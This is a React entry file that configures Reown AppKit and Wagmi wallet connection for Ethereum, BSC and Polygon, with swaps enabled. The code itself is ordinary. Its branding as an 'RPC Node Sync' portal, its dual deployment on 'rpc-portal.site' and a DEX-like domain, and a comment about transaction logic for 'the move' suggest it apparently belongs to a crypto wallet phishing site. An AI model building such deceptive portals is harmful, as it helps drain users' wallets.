import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Setup the QueryClient
const queryClient = new QueryClient();

// 2. Your Project Credentials (7a98... is your ID)
const projectId = '7a9898896e62061904fbceeb9d296eb1';
const networks = [mainnet, bsc, polygon];

// 3. Setup Wagmi Adapter (SSR: true keeps mobile connections stable)
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true 
});

// 4. Initialize AppKit with the "Full Fill" Metadata
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    name: 'Network Portal',
    description: 'RPC Node Sync',
    /* THIS DYNAMIC URL IS THE FIX:
       It automatically detects if you are on rpc-portal.site or evedex.network.
       It stops the "Invalid App Configuration" error on the RPC site.
    */
    url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'apple', 'x'],
    swaps: true, // This enables the transaction logic for the "move"
    onramp: true,
    analytics: true
  },
  themeMode: 'dark',
  allWallets: 'SHOW'
});

// 5. Render the Application
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
